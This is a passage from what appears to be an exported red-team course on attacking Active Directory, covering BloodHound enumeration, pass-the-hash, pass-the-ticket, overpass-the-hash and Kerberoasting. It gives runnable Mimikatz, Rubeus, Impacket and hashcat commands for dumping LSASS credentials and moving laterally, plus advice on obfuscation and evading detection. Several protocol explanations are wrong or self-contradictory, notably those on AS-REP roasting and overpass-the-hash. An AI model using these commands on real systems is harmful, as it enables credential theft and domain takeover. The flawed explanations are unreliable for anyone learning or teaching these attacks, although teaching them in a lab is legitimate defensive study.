-> User D -> Kerberoastable -> (Crack Hash) -> Access Service on DC -> DCSync -> Domain Admins\r\n\r\nThis is the core concept: chaining seemingly unrelated permissions and relationships to find a path to a high-value target.\r\n\r\n---\r\n\r\n### **5.5 Using BloodHound: Collection, Database, and GUI**\r\n\r\nLet's walk through the practical steps of using BloodHound.\r\n\r\n**Step 1: Obtain a Collector (SharpHound Recommended)**\r\n\r\n*   Go to the BloodHound GitHub repository (or search for \"BloodHound GitHub\").\r\n*   Find the releases page. Download the latest `SharpHound.exe` or `SharpHound.zip`.\r\n*   Transfer `SharpHound.exe` to your compromised domain-joined host in the lab environment. Place it in a directory you can execute from (e.g., `C:\\Temp`).\r\n\r\n**Step 2: Run the Collector**\r\n\r\nExecute `SharpHound.exe` from a command prompt or PowerShell window on the target host.\r\n\r\n```cmd\r\nC:\\Temp\\SharpHound.exe --collectionmethod All\r\n```\r\n\r\n*   `--collectionmethod All`: This is the most comprehensive collection method. It gathers users, groups, computers, sessions, local admins, ACLs, GPOs, and trusts. In a real engagement, you might start with less noisy methods (`Default`) and escalate if needed.\r\n*   You can specify a domain if the tool doesn't detect it correctly: `--domain your.domain.local`\r\n*   `SharpHound` will output a `.json` or `.zip` file (depending on version/flags) in the same directory it was run from. This file contains the collected data.\r\n\r\n**Pro Tip:** Running `SharpHound` with a low-privileged user will still gather significant data (users, groups, computers, trusts, basic session info visible via LDAP). Running it with a user that has local administrator rights on multiple machines or domain query privileges will collect much richer data, especially regarding sessions and local admin rights. Running it as a Domain Admin yields the most complete picture.\r\n\r\n**Step 3: Set up the Database (Neo4j)**\r\n\r\n*   Download Neo4j Desktop from the official Neo4j website.\r\n*   Install Neo4j Desktop on your attacker machine (your Kali VM, Windows analysis VM, etc.).\r\n*   Launch Neo4j Desktop.\r\n*   Click \"Add Graph\" -> \"Create a Local Graph\".\r\n*   Give it a name (e.g., \"MyADLab\").\r\n*   Set a password (remember this!).\r\n*   Click \"Create\".\r\n*   Once created, click the \"Start\" button next to your graph instance. Note the bolt address (usually `bolt://localhost:7687`).\r\n\r\n**Step 4: Launch the BloodHound GUI**\r\n\r\n*   Download the BloodHound GUI from the BloodHound GitHub releases page.\r\n*   Extract the BloodHound GUI files.\r\n*   Run the BloodHound executable (e.g., `BloodHound.exe` on Windows, `bloodhound` on Linux if installed via package manager or running from source).\r\n\r\n**Step 5: Connect to the Database and Import Data**\r\n\r\n*   When BloodHound GUI opens, it will prompt for connection details.\r\n*   **Database Type:** Neo4j\r\n*   **Database URI:** `bolt://localhost:7687` (or whatever Neo4j Desktop shows)\r\n*   **Database Username:** `neo4j`\r\n*   **Database Password:** The password you set in Step 3.\r\n*   Click \"Connect\".\r\n\r\n*   Once connected, click the \"Upload Data\" icon (up arrow) in the toolbar.\r\n*   Browse to the `.json` or `.zip` file generated by `SharpHound` on your target host and transfered back to your attacker machine.\r\n*   Select the file and click \"Open\".\r\n*   BloodHound will import the data. This might take some time depending on the size of the AD environment. Watch the status bar at the bottom.\r\n\r\n**Step 6: Querying and Analyzing the Graph**\r\n\r\nOnce the import is complete, you'll see statistics about the number of users, computers, groups, etc. Now the real fun begins!\r\n\r\nBloodHound has a search bar and a list of built-in queries in the left-hand pane. Let's explore the essential ones mentioned in the outline:\r\n\r\n*   **Shortest Path to Domain Admins:**\r\n    *   Find this query in the \"Shortest Paths\" section.\r\n    *   Click it. BloodHound will calculate and display the shortest path(s) from *any* node you own (or could potentially compromise) to the \"Domain Admins\" group.\r\n    *   *Interpretation:* This shows you the most direct routes. Each arrow represents a relationship (e.g., `AdminTo`, `MemberOf`, `HasSession`). Follow the path: \"If I compromise [Node A], I can get to [Node B] because of [Relationship], and from [Node B] I can get to [Node C] because of [Relationship], until I reach 'Domain Admins'\". This is your primary attack vector map!\r\n\r\n*   **Kerberoastable Users:**\r\n    *   Find this query in the \"Pre-built Queries\" section (or search for \"Kerberoastable\").\r\n    *   Click it. This query finds user accounts that have a Service Principal Name (SPN) registered and the account password is not set to \"Password Never Expires\". These are ideal targets for the Kerberoasting attack (covered in Module 6).\r\n    *   *Interpretation:* These are user accounts (often service accounts) whose NTLM hash is used to encrypt their Kerberos service ticket. If you can request a ticket for their SPN, you get an encrypted blob that can be cracked offline *without* interacting further with the user or domain controller after the initial ticket request.\r\n\r\n*   **AS-REP Roastable Users:**\r\n    *   Find this query in the \"Pre-built Queries\" section (or search for \"AS-REP\").\r\n    *   Click it. This query finds user accounts where the 'Do not require Kerberos preauthentication' flag is set.\r\n    *   *Interpretation:* These accounts don't perform the initial Kerberos preauthentication step (which uses a timestamp encrypted with the user's password hash). This means you can send an AS-REQ packet requesting a TGT for this user, and the KDC will return the user's TGT encrypted with their NTLM hash, without needing to know their password or perform the secure timestamp exchange. You can then crack this hash offline (covered in Module 6).\r\n\r\n*   **Unconstrained Delegation:**\r\n    *   Find this query in the \"Pre-built Queries\" section (or search for \"Unconstrained Delegation\").\r\n    *   Click it. This query finds computers or users configured for unconstrained Kerberos delegation.\r\n    *   *Interpretation:* If you compromise a computer or user with unconstrained delegation enabled, and a high-privileged user (like a Domain Admin) authenticates to that compromised principal, the compromised principal receives a forwardable TGT for the high-privileged user. This TGT can then be reused to authenticate as the high-privileged user elsewhere in the domain. This is a *very* powerful primitive if you can find and exploit it.\r\n\r\n**Exploring Other Queries:**\r\n\r\n*   Browse the \"Pre-built Queries\" for others like \"AdminTo\", \"CanRDP\", \"CanPSRemote\", \"Contains\" (for OUs), etc.\r\n*   Use the search bar to find specific users, computers, or groups. Right-click on a node to explore its relationships (\"Get All Paths To/From Here\").\r\n*   Learn the Cypher query language (Neo4j's query language) to write your own custom queries for specific scenarios or relationships.\r\n\r\n---\r\n\r\n### **5.6 OpSec Considerations for AD Enumeration**\r\n\r\nWhile essential, AD enumeration isn't silent. Be mindful of the noise you're creating:\r\n\r\n*   **Native Tools (`net`, `dsquery`, `nltest`):** These execute standard Windows binaries. Their activity might appear in command-line logging or process creation logs. `nltest` queries specifically talk to Domain Controllers and can be logged there.\r\n*   **PowerShell (`Get-AD*`, `PowerView`):** PowerShell activity is heavily logged if ScriptBlock Logging and Module Logging are enabled (which they should be in well-defended networks). `PowerView` functions often make direct LDAP queries, which can be monitored on Domain Controllers.\r\n*   **SharpHound:** This tool makes a large number of LDAP and MSRPC (for sessions/local admins) queries to Domain Controllers and potentially other machines. This can be detected by monitoring tools looking for unusual query volumes or patterns from a single host. Transferring the `SharpHound.exe` executable itself can also be detected by AV/EDR. Transferring the large output `.json`/`.zip` file back to your machine is another potential detection point.\r\n\r\n**Mitigation:**\r\n*   Use credentials appropriate for the level of access you need.\r\n*   Understand the logging capabilities of the target environment.\r\n*   Consider using less noisy collection methods in SharpHound initially (`Default` often relies more on LDAP, which might be less monitored than MSRPC or session enumeration in some environments).\r\n*   Perform collection during times of high network activity if stealth is paramount (though this is never guaranteed).\r\n*   Use obfuscation for PowerShell scripts if necessary.\r\n*   Be prepared for detection and have a plan.\r\n\r\n---\r\n\r\n### **Module 5 Summary**\r\n\r\nWe've covered a massive amount of ground! We started by revisiting core AD concepts from an attacker's viewpoint. We learned how to use built-in Windows commands to gather basic AD information. We then stepped up our game with PowerShell, leveraging the `ActiveDirectory` module and the powerful `PowerView` functions for more detailed and flexible"
    },
    {
      "title": "module_6",
      "description": "module_6 Overview",
      "order": 6,
      "content": "Alright team, welcome back! We've navigated the initial host, dug deep into local enumeration and PE, and even started moving around the network. Now, we arrive at a goldmine for attackers: **credentials**.\r\n\r\nModule 6 is where we elevate our understanding of authentication and learn how to leverage harvested credentials, hashes, and tickets in sophisticated ways to unlock further access and pave the way to domain dominance. This is where the real power plays begin!\r\n\r\nAs always, everything we discuss is for ethical red teaming and security testing *within your own lab environment*. Understanding these techniques is crucial for building robust defenses. Let's dive in!\r\n\r\n---\r\n\r\n## **Module 6: Advanced Credential Attacks**\r\n\r\n### **Module Objective:**\r\n\r\nDeepen your understanding of NTLM and Kerberos authentication and execute sophisticated credential-based attacks to obtain hashes, tickets, and gain access to resources within an Active Directory environment.\r\n\r\n### **Essential Subtopics:**\r\n\r\n1.  In-depth look at NTLM authentication (challenges, responses, hash formats).\r\n2.  Pass-the-Hash (PtH) techniques and tools.\r\n3.  Understanding Kerberos authentication (TGT, TGS, SPNs).\r\n4.  Pass-the-Ticket (PtT) techniques.\r\n5.  Overpass-the-Hash (PtT using NTLM hash to request a TGT).\r\n6.  Kerberoasting: Identifying Service Principal Names (SPNs), requesting service tickets, and offline cracking.\r\n7.  AS-REP Roasting: Identifying users with 'Do not require Kerberos preauthentication' and requesting their initial authentication hash.\r\n8.  Leveraging tools like Mimikatz, Rubeus, Impacket.\r\n9.  Defenses and detection methods for these attacks.\r\n10. Case Study: How credential attacks are used in major breaches.\r\n\r\n---\r\n\r\n### **6.1 Authentication Deep Dive (Relevant to Attacks)**\r\n\r\nBefore we can exploit authentication mechanisms, we need a slightly deeper understanding of how they *actually work* in a Windows and Active Directory context. We'll focus on the aspects critical for the attacks we're about to learn.\r\n\r\n#### **6.1.1 NTLM Authentication**\r\n\r\nNTLM (NT LAN Manager) is an older authentication protocol but is still widely used, especially for local authentication and in scenarios where Kerberos isn't available or configured. It's a challenge/response protocol.\r\n\r\n*   **The Flow (Simplified):**\r\n    1.  Client sends a negotiation message to the server.\r\n    2.  Server sends back a challenge (a random nonce).\r\n    3.  Client encrypts the challenge using the *hash* of the user's password and sends the encrypted challenge back as the response.\r\n    4.  Server (or a Domain Controller it trusts) retrieves the user's password hash, encrypts the original challenge with it, and compares the result to the client's response.\r\n    5.  If they match, authentication succeeds.\r\n\r\n*   **Why Pass-the-Hash Works:** Notice step 3. The client *never* sends the actual password. It only needs the *hash* of the password to calculate the correct response to the server's challenge. If an attacker obtains this hash, they can perform the same calculation and authenticate as the user *without ever knowing the original password*. This is the fundamental principle behind Pass-the-Hash.\r\n\r\n*   **NTLM Hashes:** The hash used is typically the NTLM hash (MD4 of the UTF-16 representation of the password). Tools like Mimikatz often dump this hash directly from memory (LSASS). You'll commonly see them represented as 32 hexadecimal characters.\r\n    *   Example: `518b05f361ad763729324a0189a73422` (This is *not* a real hash, just format example).\r\n\r\n#### **6.1.2 Kerberos Authentication**\r\n\r\nKerberos is the *default* and preferred authentication protocol in Active Directory domains. It's more secure than NTLM (when configured correctly) and relies on a trusted third party, the Key Distribution Center (KDC), which is typically a Domain Controller (DC). Kerberos uses \"tickets\" to grant access.\r\n\r\n*   **Key Components:**\r\n    *   **Client:** The user or service requesting access.\r\n    *   **Server:** The resource or service the client wants to access.\r\n    *   **KDC (Key Distribution Center):** Consists of two parts:\r\n        *   **AS (Authentication Service):** Issues Ticket Granting Tickets (TGTs).\r\n        *   **TGS (Ticket Granting Service):** Issues Service Tickets (TGSs).\r\n    *   **Principal:** An entity that can be authenticated (user, computer, service). Each principal has a secret key (derived from their password/machine account password).\r\n    *   **Realms:** Kerberos domains (in AD, the domain name is the realm).\r\n\r\n*   **The Flow (Simplified - Requesting a Service Ticket):**\r\n    1.  **AS-REQ (Authentication Service Request):** Client sends its username to the AS, requesting a TGT. The request is encrypted with the client's secret key (password hash).\r\n    2.  **AS-REP (Authentication Service Reply):** AS verifies the client's identity. If valid, it generates a TGT. The TGT contains information about the client and is encrypted with the KDC's secret key (the `krbtgt` account hash). The AS sends this TGT back to the client, encrypted with the client's secret key. *The client can now decrypt the outer layer to get the TGT, but cannot read the contents inside (encrypted with `krbtgt` hash).*\r\n    3.  **TGS-REQ (Ticket Granting Service Request):** When the client wants to access a specific service (e.g., a file share on a server), it sends the TGT (obtained in step 2) to the TGS, requesting a Service Ticket for that service's Principal (identified by its SPN).\r\n    4.  **TGS-REP (Ticket Granting Service Reply):** TGS verifies the TGT (using its `krbtgt` key). If valid, it generates a Service Ticket for the requested service. This Service Ticket is encrypted with the *service principal's* secret key (the hash of the user account or computer account the SPN is associated with). The TGS sends this Service Ticket back to the client, encrypted with a session key shared between the client and TGS (which was included inside the TGT).\r\n    5.  **AP-REQ (Application Request):** Client sends the Service Ticket (obtained in step 4) to the target Server/Service.\r\n    6.  **AP-REP (Application Reply):** Server receives the Service Ticket, decrypts it using its own secret key (the service principal's hash). If successful, it verifies the client's identity and grants access.\r\n\r\n*   **Why Pass-the-Ticket Works:** If an attacker obtains a valid TGT or TGS ticket (e.g., by dumping the credential cache from LSASS), they can inject it into their own session. The operating system's Kerberos implementation will then present this ticket when attempting to access resources, allowing the attacker to authenticate as the user the ticket belongs to, *without knowing the password or hash*.\r\n\r\n*   **Why Kerberoasting Works:** Look at step 4. The Service Ticket is encrypted with the *service principal's secret key* (their NTLM hash). If a service principal is associated with a *user* account (common for custom applications, SQL services, etc.), and an attacker can obtain that service ticket (which any authenticated domain user can request for *any* SPN), they can attempt to decrypt the ticket offline using the service account's hash. This is a direct path to obtaining the service account's NTLM hash for offline cracking.\r\n\r\n*   **Why AS-REP Roasting Works:** Look at step 1. The AS-REQ is normally encrypted with the user's secret key (hash). However, if the 'Do not require Kerberos preauthentication' flag is set for a user, the initial AS-REQ is sent *without* this encryption step. The AS-REP returned contains a timestamp encrypted with the user's hash. An attacker capturing this exchange can extract the encrypted timestamp and crack it offline to recover the user's NTLM hash.\r\n\r\n*   **Service Principal Names (SPNs):** These are unique identifiers for service instances. They are associated with a computer account (e.g., `HOST/server.domain.com`) or a user account (e.g., `MSSQLSvc/db.domain.com:1433`). When a client wants to access a service, it asks the KDC for a service ticket for that service's SPN. The KDC looks up which account the SPN is registered to and encrypts the service ticket with *that account's* password hash. This is the Achilles' heel Kerberoasting exploits.\r\n\r\n---\r\n\r\n### **6.2 Pass-the-Hash (PtH)**\r\n\r\nPtH is a classic technique that exploits the NTLM protocol's reliance on the password hash rather than the password itself. If you have a user's NTLM hash, you can authenticate to resources that accept NTLM authentication as that user.\r\n\r\n*   **Concept:** Authenticate using the user's NTLM hash instead of their plaintext password.\r\n*   **Requirements:** The user's NTLM hash and access to a system or tool that can perform PtH. The target system must support NTLM authentication.\r\n*   **Common Targets:** File shares (SMB/CIFS), WMI, PsExec, SQL databases, RDP (in some configurations).\r\n\r\n*   **Tools & Techniques:**\r\n\r\n    *   **Mimikatz:** The go-to tool for Windows credential manipulation.\r\n        *   First, you often need to dump credentials, including hashes, from LSASS.\r\n        ```powershell\r\n        # Requires administrator privileges on the target host\r\n        # Make sure to download and execute Mimikatz carefully, AV will flag it!\r\n        # Method 1: Direct execution (often blocked by AV/EDR)\r\n        # mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\r\n\r\n        # Method 2: Load into PowerShell (requires admin)\r\n        # Import-Module .\\Invoke-Mimikatz.ps1\r\n        # Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'\r\n        ```\r\n        *   Once you have hashes (e.g., `UserA::DOMAIN:LMHASH:NTHASH:::`), you can use the `sekurlsa::pth` command.\r\n        ```powershell\r\n        # Example: Using Mimikatz to launch a command prompt with PtH\r\n        # Replace DOMAIN, UserA, and NTHASH with harvested values\r\n        mimikatz.exe \"sekurlsa::pth /user:UserA /domain:DOMAIN /ntlm:NTHASH /run:cmd.exe\" exit\r\n        ```\r\n        This will pop a new command prompt running under the context of `DOMAIN\\UserA`, authenticated via PtH using only the NTLM hash. You can then use this prompt to access resources that `UserA` has access to (e.g., `dir \\\\server\\share`).\r\n\r\n    *   **Impacket (Python Toolkit):** Excellent cross-platform tools for interacting with Windows services, often supporting PtH. Run these from your attacker machine (e.g., Kali).\r\n        *   **`psexec.py`:** Executes commands remotely (like Sysinternals PsExec).\r\n        ```bash\r\n        # Authenticate using hash to run cmd.exe on TargetServer\r\n        # Replace DOMAIN, UserA, NTHASH, and TargetServer\r\n        psexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\r\n        # Or if you don't know the domain, sometimes just user@target is enough\r\n        # psexec.py UserA@TargetServer -hashes :NTHASH\r\n        ```\r\n        *   **`wmiexec.py`:** Executes commands remotely via WMI. Often less detected than PsExec.\r\n        ```bash\r\n        # Authenticate using hash to run cmd.exe on TargetServer via WMI\r\n        # Replace DOMAIN, UserA, NTHASH, and TargetServer\r\n        wmiexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\r\n        ```\r\n        *   **`smbexec.py`:** Executes commands remotely via SMB (creates a service like PsExec but can be stealthier).\r\n        ```bash\r\n        # Authenticate using hash to run cmd.exe on TargetServer via SMB\r\n        # Replace DOMAIN, UserA, NTHASH, and TargetServer\r\n        smbexec.py DOMAIN/UserA@TargetServer -hashes :NTHASH\r\n        ```\r\n        *   **Accessing File Shares:** You can also use tools like `smbclient.py` or `crackmapexec` with hashes.\r\n        ```bash\r\n        # List shares on TargetServer using crackmapexec with hash\r\n        # Replace DOMAIN, UserA, NTHASH, and TargetServer\r\n        crackmapexec smb TargetServer -d DOMAIN -u UserA -H NTHASH\r\n\r\n        # Access a specific share using smbclient.py with hash\r\n        # Replace DOMAIN, UserA, NTHASH, TargetServer, and ShareName\r\n        smbclient.py DOMAIN/UserA@TargetServer -hashes :NTHASH -share ShareName\r\n        ```\r\n\r\n*   **OpSec Considerations:**\r\n    *   Successful NTLM authentication events (Event ID 4776 on DCs, 4624 on target host) will be logged. The logon type might be different than interactive.\r\n    *   Network traffic will show NTLMv2 challenge/response, but the actual password isn't sent.\r\n    *   Using tools like PsExec creates services on the target host, which can be noisy. WMI and SMBExec might be quieter.\r\n\r\n---\r\n\r\n### **6.3 Pass-the-Ticket (PtT)**\r\n\r\nPtT leverages stolen Kerberos tickets (TGTs or TGSs) to authenticate to resources. Since the ticket itself represents proof of authentication, you don't need the password or hash.\r\n\r\n*   **Concept:** Authenticate using a valid Kerberos ticket instead of a password or hash.\r\n*   **Requirements:** A valid Kerberos ticket file (`.kirbi` extension is common) and access to a system where you can inject the ticket into the current user's session/credential cache.\r\n*   **Common Targets:** Any service or resource that uses Kerberos authentication (most domain resources by default).\r\n\r\n*   **Tools & Techniques:**\r\n\r\n    *   **Mimikatz:** Again, a primary tool. You first need to extract tickets from memory.\r\n        ```powershell\r\n        # Requires administrator privileges\r\n        # Dump Kerberos tickets from LSASS\r\n        # mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\r\n        # This exports tickets to .kirbi files in the current directory\r\n        ```\r\n        *   Once you have `.kirbi` files (e.g., `TGT_UserA@DOMAIN.TGT.kirbi`, `TGS_UserA@DOMAIN_Service@Server.TGS.kirbi`), you can inject them.\r\n        ```powershell\r\n        # Inject a TGT ticket (allows requesting new service tickets)\r\n        # Replace path_to_ticket.kirbi\r\n        mimikatz.exe \"kerberos::ptt path_to_ticket.kirbi\" exit\r\n\r\n        # Inject a TGS ticket (allows accessing the specific service/resource it's for)\r\n        # Replace path_to_ticket.kirbi\r\n        mimikatz.exe \"kerberos::ptt path_to_ticket.kirbi\" exit\r\n        ```\r\n        *   After injecting a ticket, you can verify it using `klist` in a command prompt.\r\n        ```cmd\r\n        klist\r\n        ```\r\n        You should see the injected ticket listed. You can then access resources as that user.\r\n\r\n    *   **Rubeus:** A C# Kerberos interaction toolkit, often preferred for its flexibility and less signature-based detection compared to Mimikatz's executable.\r\n        *   Dump tickets using Rubeus (from a privileged shell):\r\n        ```powershell\r\n        # Requires administrator privileges\r\n        # Download Rubeus.exe\r\n        # Execute Rubeus from PowerShell\r\n        .\\Rubeus.exe dump /luid:0 # Dump tickets for the current logon session (often 0 for SYSTEM)\r\n        .\\Rubeus.exe dump /service:krbtgt # Dump the krbtgt ticket (very powerful!)\r\n        ```\r\n        *   Inject tickets using Rubeus:\r\n        ```powershell\r\n        # Inject a ticket from a .kirbi file\r\n        .\\Rubeus.exe ptt /ticket:path_to_ticket.kirbi\r\n        ```\r\n\r\n*   **OpSec Considerations:**\r\n    *   The `klist` command run by the OS shows the injected tickets.\r\n    *   Successful Kerberos authentication events (Event ID 4768 - TGT request, 4769 - TGS request, 4624 - Logon) will be logged on DCs and target hosts. The source of the request might be unusual (e.g., a host not typically used by that user).\r\n    *   Less network noise initially compared to PtH, as the ticket is reused.\r\n\r\n---\r\n\r\n### **6.4 Overpass-the-Hash (OtH)**\r\n\r\nOtH is a technique to obtain a Kerberos TGT using an NTLM hash. This is useful when you have a hash but prefer to use Kerberos for subsequent lateral movement or resource access, or when NTLM authentication might be blocked or more heavily monitored.\r\n\r\n*   **Concept:** Use a user's NTLM hash to request a Kerberos TGT from the KDC.\r\n*   **Requirements:** The user's NTLM hash (or AES key, which is even better but harder to get), the user's SID, the domain name, and the NTLM hash of the `krbtgt` account (or its AES key). *Wait, getting the `krbtgt` hash requires domain admin or equivalent!* Yes, OtH often comes *after* some level of compromise or in specific scenarios. However, there are variations where you might request a TGT for a *different* user using a hash you *do* have. The core idea is using a hash to *request* a ticket. A common use case is using a user hash to request their TGT, then using that TGT for PtT.\r\n\r\n*   **Tools & Techniques:**\r\n\r\n    *   **Mimikatz:** Can generate tickets using hashes or keys.\r\n        ```powershell\r\n        # This is often used for Golden Ticket (M7), but the principle applies\r\n        # Requesting a TGT using NTLM hash (requires krbtgt hash or key for full forge)\r\n        # More commonly used for Golden Ticket forging (any user TGT)\r\n        # mimikatz.exe \"kerberos::golden /user:UserA /domain:DOMAIN.LOCAL /sid:S-1-5-21-...\" /krbtgt:krbtgt_NTHASH /ticket:outh_UserA.kirbi\" exit\r\n        # Then use kerberos::ptt outh_UserA.kirbi\r\n        ```\r\n        *   *Correction:* While Mimikatz *can* forge tickets, the simpler OtH concept (using a hash to *request* a legitimate TGT from the KDC) is often done via Rubeus or Impacket. Mimikatz's `kerberos::ptt` can inject a ticket *you already have*. The \"Overpass\" part is the act of *requesting* the ticket with the hash.\r\n\r\n    *   **Rubeus:** Excellent for requesting tickets.\r\n        ```powershell\r\n        # Request a TGT for UserA using their NTLM hash\r\n        # Requires UserA's SID (can get via AD enumeration or whoami /user)\r\n        .\\Rubeus.exe asktgt /user:UserA /domain:DOMAIN.LOCAL /rc4:UserA_NTHASH /ptt\r\n        # The /ptt flag automatically injects the resulting TGT\r\n        ```\r\n        This command tells Rubeus to act as UserA, use their NTLM hash (`/rc4:`) to encrypt the AS-REQ timestamp, send it to the DC, receive the AS-REP (containing the encrypted TGT), and inject it. You now have UserA's TGT via hash.\r\n\r\n    *   **Impacket:** `getTGT.py` can also request TGTs using hashes.\r\n        ```bash\r\n        # Request TGT for UserA using NTLM hash and save to UserA.ccache\r\n        # Replace DOMAIN, UserA, UserA_NTHASH, DC_IP\r\n        getTGT.py DOMAIN/UserA@DC_IP -hashes :UserA_NTHASH -dc-ip DC_IP\r\n        # Output will be UserA.ccache - this is a ticket file format.\r\n        # You can then use impacket tools with -k flag and KB5-CCACHE env var,\r\n        # or convert to .kirbi and use Mimikatz/Rubeus ptt.\r\n        ```\r\n\r\n*   **OpSec Considerations:**\r\n    *   The KDC will log a successful AS-REQ (Event ID 4768) for the user. The authentication method might be logged (e.g., NTLM hash used for Kerberos authentication).\r\n    *   Less noisy than PtH on the network *after* the TGT is obtained, as subsequent access uses Kerberos tickets.\r\n\r\n---\r\n\r\n### **6.5 Kerberoasting**\r\n\r\nThis is a powerful technique to obtain password hashes of service accounts that are associated with user accounts (not computer accounts) by requesting and cracking their service tickets offline.\r\n\r\n*   **Concept:** Request a Kerberos Service Ticket (TGS) for a Service Principal Name (SPN) registered to a *user* account. The TGS is encrypted with the target user account's NTLM hash. Capture the ticket and crack the hash offline.\r\n*   **Requirements:** An authenticated domain user session (even low privilege).\r\n*   **Why it works:** Any authenticated domain user can request a service ticket for *any* registered SPN in the domain. If that SPN maps to a user account, the ticket is encrypted with that user's password hash.\r\n\r\n*   **The Steps:**\r\n\r\n    1.  **Enumerate SPNs:** Find SPNs registered to user accounts.\r\n    2.  **Request Service Tickets:** Request TGS tickets for the identified SPNs.\r\n    3.  **Export Tickets:** Save the requested tickets in a crackable format.\r\n    4.  **Crack Hashes:** Use a password cracker (Hashcat, John the Ripper) offline to recover the plaintext passwords from the NTLM hashes extracted from the tickets.\r\n\r\n*   **Tools & Techniques:**\r\n\r\n    *   **PowerView (PowerSploit):** Excellent PowerShell script for AD enumeration.\r\n        ```powershell\r\n        # Requires an active domain session (run from a domain-joined host or via remoting)\r\n        # Import PowerView.ps1\r\n        # Find all domain users with SPNs\r\n        Get-DomainUser -SPN | Select-Object Name, SamAccountName, ServicePrincipalNames\r\n        ```\r\n        This command lists users and their SPNs. Look for SPNs that seem unusual or are associated with user accounts you want to target.\r\n\r\n    *   **Rubeus:** Can automate the entire process of requesting and formatting tickets for cracking.\r\n        ```powershell\r\n        # Requires an active domain session\r\n        # Download Rubeus.exe\r\n        # Execute Rubeus to perform Kerberoasting\r\n        .\\Rubeus.exe kerberoast\r\n        ```\r\n        This command performs the enumeration, requests tickets for found SPNs, and outputs the ticket data in a format suitable for Hashcat or John (hash mode 13100).\r\n\r\n    *   **Impacket:** `GetUserSPNs.py` script.\r\n        ```bash\r\n        # Run from attacker machine (e.g., Kali)\r\n        # Requires valid domain credentials (any domain user is usually enough)\r\n        # Replace DOMAIN, User, Password, DC_IP\r\n        GetUserSPNs.py DOMAIN/User:Password -dc-ip DC_IP\r\n        # Or using a hash if you have one (PtH style)\r\n        # GetUserSPNs.py DOMAIN/User@DC_IP -hashes :NTHASH -dc-ip DC_IP\r\n        ```\r\n        This script also enumerates, requests, and outputs crackable hashes.\r\n\r\n    *   **Hashcat/John the Ripper:** For offline cracking of the obtained hashes.\r\n        *   Hashcat mode 13100 for Kerberoast hashes.\r\n        ```bash\r\n        # Assuming Rubeus/Impacket outputted to a file named hashes.txt\r\n        # Replace /path/to/wordlist.txt\r\n        hashcat -m 13100 hashes.txt /path/to/wordlist.txt --force # --force if run in VM/unsupported env\r\n        ```\r\n        *   John the Ripper can often auto-detect the format if you use the `--format=krb5tgs` flag or just `john --wordlist=... hashes.txt`.\r\n\r\n*   **OpSec Considerations:**\r\n    *   Multiple TGS-REQ requests from a single user/host in a short period (Event ID 4769 on DCs). This is a primary detection vector.\r\n    *   Requests for unusual or a large number of SPNs.\r\n    *   Network traffic analysis might show unusual Kerberos activity.\r\n\r\n---\r\n\r\n### **6.6 AS-REP Roasting**\r\n\r\nAS-REP Roasting targets users with the 'Do not require Kerberos preauthentication' flag set.\r\n\r\n*   **Concept:** Identify users with the `DONT_REQ_PREAUTH` user account control flag. For these users, the initial Kerberos authentication request (AS-REQ) is not encrypted with their password hash. Requesting an AS-REQ for such a user allows capturing a portion of the response (the encrypted timestamp) that can be cracked offline to recover their NTLM hash.\r\n*   **Requirements:** An authenticated domain user session (even low privilege).\r\n*   **Why it works:** The vulnerability is in the specific user account setting (`"
    },
    {
      "title": "module_7",
      "description": "module_7 Overview",
      "order": 7,
      "content": "Alright team, buckle up! We've journeyed from a single compromised host, learned to find our way around, grab local goodies, elevate our access, hop between machines, and map out the entire Active Directory forest. Now, we're standing at the precipice of ultimate power within the domain.\r\n\r\nThis is Module 7: **Domain Dominance & Persistence**. This is where we transition from being just *on* the network to effectively *owning* it. We'll learn the techniques that allow attackers to seize control of the domain itself and, crucially, how to ensure that control persists even if our initial footholds are discovered and removed.\r\n\r\nThis module is powerful. These techniques are the crown jewels of many advanced persistent threats (APTs) and red teams. With great power comes great responsibility ‚Äì remember, we are doing this to *learn* and *defend*. All practical exercises *must* be conducted in your isolated lab environment.\r\n\r\n---\r\n\r\n## Module 7: Domain Dominance & Persistence\r\n\r\n**Module Objective:** Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.\r\n\r\n**Learning Goals:** By the end of this module, you will be able to:\r\n\r\n*   Understand and leverage high-privilege credentials and tickets for domain control.\r\n*   Explain the theory and execute practical attacks like Golden and Silver Tickets.\r\n*   Identify and potentially exploit SIDHistory for cross-domain privilege escalation.\r\n*   Implement various methods for maintaining persistent access within an Active Directory domain.\r\n*   Discuss the operational security implications of domain-level actions.\r\n\r\n---\r\n\r\n### 7.1 Leveraging Attack Paths & Targeting High-Value Accounts\r\n\r\nWe spent Module 5 meticulously mapping the Active Directory landscape with tools like PowerView and, most importantly, BloodHound. Module 6 equipped us with advanced credential attacks like Kerberoasting and AS-REP Roasting. Now, it's time to synthesize that information and execute.\r\n\r\n**Theory:**\r\n\r\nBloodHound isn't just pretty graphs; it's a sophisticated pathfinding engine. It takes the relationships (sessions, group memberships, ACLs, delegation rights, etc.) you enumerated and finds the *shortest paths* from your initial access point (or any user/computer you control) to your desired target (usually Domain Admins, but could be sensitive data, specific servers, etc.).\r\n\r\nIdentifying high-value accounts means finding users or groups that possess privileges allowing control over significant parts of the domain. The ultimate prize is typically the `Domain Admins` group, but others like `Enterprise Admins`, `Builtin Administrators` (on DCs), `Backup Operators`, or even users with specific powerful rights (like `SeEnableDelegationPrivilege` or `GenericAll` on critical objects) can be targets.\r\n\r\n**Practical Application:**\r\n\r\n1.  **Review BloodHound Output:** Go back to your Neo4j database from Module 5.\r\n    *   Run queries like:\r\n        *   `Find shortest paths to Domain Admins`\r\n        *   `Find principals with unconstrained delegation`\r\n        *   `Find high value targets`\r\n        *   `Find Kerberoastable accounts` (if you haven't exploited them yet)\r\n        *   `Find computers where Domain Admins have sessions`\r\n    *   Analyze the paths. Each edge in the graph represents a potential step (e.g., \"User X has session on Computer Y\", \"User A is member of Group B\", \"Computer Z has Admin rights on Computer W\").\r\n    *   Identify the *type* of relationship you need to exploit to move along the path. Is it a session you can hijack? A credential you can reuse (PtH/PtT)? A service ticket you can request and crack (Kerberoasting)? A misconfigured ACL you can leverage?\r\n2.  **Prioritize Targets:** Focus on paths that seem most feasible based on the credentials/access you've already obtained or believe you can obtain easily. A path involving Kerberoasting a few accounts might be quicker than finding a complex PE on a specific machine.\r\n3.  **Execute Based on Path:** This is where you apply techniques from Modules 